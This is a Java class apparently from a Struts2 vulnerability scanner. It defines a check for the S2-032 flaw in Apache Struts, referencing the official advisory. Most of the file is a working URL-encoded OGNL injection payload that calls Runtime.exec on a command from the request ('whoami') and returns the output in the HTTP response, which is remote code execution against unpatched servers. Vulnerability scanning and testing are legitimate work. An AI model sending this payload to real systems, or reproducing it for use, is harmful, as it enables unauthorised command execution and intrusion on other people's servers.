package com.mtx.xiatian.hacker.struts2Scan;

/**
 * 远程代码、命令z
 * http://struts.apache.org/docs/s2-032.html
 * @author xiatian，fucong
 *
 */
public class S2_032 extends CheckTools implements IStruts2Scan {

	private static String s2_032_POC = "method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command[0]%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char[51020]%2c%23c.read%28%23d%29%2c%23kxlzx%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%29%2c%23kxlzx.close&command=whoami";
	
	@Override
	public boolean doS2LeakScan(String target) {
		return doS2LeakScan(target, s2_032_POC);
	}

}
